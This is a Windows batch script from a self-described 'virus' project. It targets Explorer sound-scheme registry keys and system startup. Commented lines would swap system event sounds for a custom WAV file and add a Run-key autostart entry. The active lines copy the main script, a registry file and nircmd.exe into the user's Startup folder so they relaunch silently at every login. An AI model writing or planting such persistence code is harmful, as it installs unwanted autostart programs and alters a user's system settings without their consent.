@echo off
echo Ordinateur\HKEY_CURRENT_USER\AppEvents\Schemes\Apps\Explorer\MoveMenuItem\.Current
echo Ordinateur\HKEY_CURRENT_USER\AppEvents\Schemes\Apps\Explorer\MoveMenuItem\.Modified
echo Ordinateur\HKEY_CURRENT_USER\AppEvents\Schemes\Apps\Explorer\Navigating\.Current
echo Ordinateur\HKEY_CURRENT_USER\AppEvents\Schemes\Apps\Explorer\Navigating\.Modified
@rem REG DELETE HKEY_CURRENT_USER\AppEvents\Schemes\Apps\Explorer\MoveMenuItem\.Current /f
@rem Oui
@rem REG ADD HKEY_CURRENT_USER\AppEvents\Schemes\Apps\Explorer\MoveMenuItem\.Current /t REG_SZ /d D:\Ecole /f

@rem %SystemRoot%\media\Ring03.wav

echo D:\Ecole\Programation\Batch\HoniChan Virus\Darling.wav
@rem REG ADD HKEY_CURRENT_USER\AppEvents\Schemes\Apps\Explorer\MoveMenuItem\.Current /t REG_SZ /d D:\Ecole\Programation\Batch\HoniChan Virus\Darling.wav /f

echo HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
@rem REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v TestProgram /t REG_SZ /d "C:\ProgramData\EchoEcho.bat" /f

echo %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup


@rem Old StartUp

set script_name="main.bat"
set registre_name="registre_value.txt"
set volume_nircmd="nircmd.exe"

copy %script_name% "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy %registre_name% "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy %volume_nircmd% "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

